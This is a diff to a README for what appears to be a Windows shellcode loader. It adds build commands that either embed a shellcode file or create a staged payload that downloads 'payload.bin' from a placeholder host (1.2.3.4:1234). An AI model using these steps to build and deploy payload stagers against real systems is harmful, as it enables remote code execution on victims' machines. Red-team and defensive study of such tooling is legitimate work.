@@ -14,7 +14,11 @@ x86_64-w64-mingw32-gcc-win32 --version
 
 ## Building
 ```sh
-python3 compile.py
+# Option1 - Non staged (embed shellcode in payload)
+python3 compile.py --shellcode-file <payload.bin>
+
+# Option2 - Staged
+python3 compile.py --stager-url http://1.2.3.4:1234/payload.bin
 ```
 This will produce three files in the `bin` directory:
 
